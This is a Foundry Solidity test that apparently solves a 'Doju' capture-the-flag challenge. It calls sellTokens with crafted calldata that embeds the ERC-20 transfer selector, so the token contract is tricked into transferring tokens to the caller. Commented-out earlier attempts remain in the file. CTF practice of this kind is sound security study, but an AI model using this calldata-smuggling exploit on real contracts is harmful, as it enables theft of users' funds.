// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Doju} from "../src/Doju.sol";
import {Challenge} from "../src/Challenge.sol";

contract DojuTest is Test {
    Challenge public challenge;

    function setUp() public {
        challenge = new Challenge();
    }

    function test_Solve() public {
        Doju doju = challenge.doju();

        // vm.startPrank(0xa9059CbBFFffFfFFFFfFFffffffFfFFFfFffffFF);
        // vm.deal(0xa9059CbBFFffFfFFFFfFFffffffFfFFFfFffffFF, 100 ether);
        // challenge.claimTokens();
        uint256 initialBalance = address(this).balance;

        // doju.buyTokens{value: 1 ether}(address(0xa9059CbBFFffFfFFFFfFFffffffFfFFFfFffffFF));
        doju.sellTokens(
            0, address(doju), uint256(bytes32(abi.encodePacked(hex"a9059CbB000000000000000000000000", address(this))))
        );
    }

    fallback() external payable {}
}
